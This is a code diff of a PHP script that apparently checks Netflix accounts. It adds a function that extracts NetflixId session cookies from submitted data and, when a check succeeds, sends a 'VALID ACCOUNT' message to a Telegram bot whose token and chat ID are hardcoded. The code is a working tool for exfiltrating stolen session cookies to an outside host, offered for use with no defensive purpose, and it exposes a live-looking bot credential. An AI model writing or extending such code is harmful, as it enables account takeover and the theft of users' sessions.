@@ -1,9 +1,26 @@
 <?php
 putenv("TG_BOT_TOKEN=8151381339:AAHIxF0ERcB-u3fxcja99lObDozXjxoOKPk");
 putenv("TG_CHAT_ID=6691379845");
+
+function extractNetflixId($cookie) {
+    if (!$cookie) return "N/A";
+
+    // Match NetflixId
+    if (preg_match('/NetflixId=([^;]+)/', $cookie, $match)) {
+        return $match[1];
+    }
+
+    // Fallback SecureNetflixId
+    if (preg_match('/SecureNetflixId=([^;]+)/', $cookie, $match)) {
+        return $match[1];
+    }
+
+    return "N/A";
+}
+
 function sendToTelegram($text) {
-    $botToken = getenv('8151381339:AAHIxF0ERcB-u3fxcja99lObDozXjxoOKPk'); // 🔒 hidden
-    $chatId = getenv('6691379845');     // optional but recommended
+    $botToken = getenv('TG_BOT_TOKEN');
+    $chatId = getenv('TG_CHAT_ID');
 
     $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
 
@@ -77,6 +94,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $decoded = json_decode($response, true);
 
     if (isset($decoded['status']) && $decoded['status'] === 'SUCCESS') {
+        $netflixId = extractNetflixId($json_data['cookie']);
 $msg =
 "🎯 VALID ACCOUNT\n\n" .
 
